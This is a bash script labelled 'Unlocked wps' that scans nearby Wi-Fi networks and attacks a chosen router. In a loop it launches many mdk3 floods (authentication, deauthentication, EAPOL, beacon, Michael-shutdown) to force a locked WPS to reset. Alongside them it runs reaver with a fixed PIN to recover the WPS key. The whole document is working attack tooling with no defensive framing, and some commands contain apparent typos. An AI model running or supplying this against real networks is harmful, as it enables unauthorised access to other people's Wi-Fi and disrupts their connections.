#!/bin/bash
#Unlocked wps

menu () {
clear
#Color
cyan='\e[0;36m'
red='\e[1;31m'
yellow='\e[1;33m'
Green1='\033[1;32m'
NC='\033[0m'
LightGreen='\033[1;32m'
Blue='\033[1;34m'
Green='\033[0;32m'
Red='\033[1;31m'
echo -e $red' Options:'
echo ""
echo -e $Blue"       ${cyan}1${yellow}) ${Blue}GET ${Green}BSSID & ESSID ${NC} ${Blue}"
echo -e       "       ${cyan}2${yellow}) ${Blue}Manual ${Green}BSSID ${NC} ${Blue} ${Green}Wps${NC} $Blue."
echo ""
echo -n -e $red'  \033[4mChoose:\033[0m >> '; tput sgr0
read choice
case $choice in
1)scan;;
2)attack;;
esac
}
scan () {
printf "${cyan}choose interface ${Green}wlan0 ${cyan} Or ${Green}wlan1${NC} : "
read interface ;
monitors
echo -e ${Red} "${NC}${Blue} ${Green}SCAN ${Blue} ${NC} ${Green}Ctrl+C ${NC}${Blue} :${NC}"
read click
gnome-terminal -e "timeout 80s airodump-ng wlan0mon ";
sleep 30s
menu
}
attack () {
printf "${cyan}ESSID ${yellow}: ${NC}"
read essid ;
printf "${cyan}BSSID ${yellow}: ${NC}"
read bssid ;
printf "${cyan}Channel ${yellow}: ${NC}"
read channel ;
printf "${cyan}Interface ${yellow}: ${NC}"
read wlan ;

while true
do
rm -f /reaverlog.txt
xterm -e timeout 70s mdk3 "$wlan" a- "$bssid" -m &
xterm -e timeout 2m mdk3 mon1 x 0 -t "$bssid" -n "$essid" -s 5500 &
xterm -e timeout 2m mdk3 mon2 x 0 -t "$bssid" -n "$essid" -s 5500 &
xterm -e timeout 2m mdk3 mon3 x 0 -t "$bssid" -n "$essid" -s 5500 &
xterm -e timeout 2m mdk3 mon4 a -a "$essid" &
xterm -e timeout 2m mdk3 mon5 d -c $channel  &
xterm -e timeout 2m mdk3 mon6 d -c $channel  &
xterm -e timeout 2m mdk3 mon7 d -c $channel &
xterm -e timeout 2m mdk3 mon8 -b blacklist -t "$bssid" -c $channel X &
xterm -e timeout 2m mdk3 mon9 -b blacklist -t "$bssid" -c $channel X &
xterm -e timeout 2m mdk3 mon10 -b  -t "$bssid" -c $channel X &
xterm -e timeout 2m mdk3 mon11 m -t "$bssid" &
xterm -e timeout 2m mdk3 mon12 f -t "$bssid" -f 99:99:99 &
reaver -i "$wlan" -b "$bssid" - c $channel -p 24189378 -vv -P  >> /root/reaverlog.txt &
tail -f /root/reaverlog.txt &
if
tail -f /root/reaverlog.txt  | grep -q Timeout
then
killall reaver
killall tail
fi
killall airodump-ng &
sleep 3m
done
}
cleaner () { i="1";
while [ $i -lt 15 ];
do
airmon-ng stop mon$i >> /dev/null
i=$((i+1))
done }
monitors () {
echo -e $Green "[+] ${cyan}Starting Monitors...${NC}"
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
echo -e $Green "[+] ${cyan}Oky Done .${NC}";
}
menu
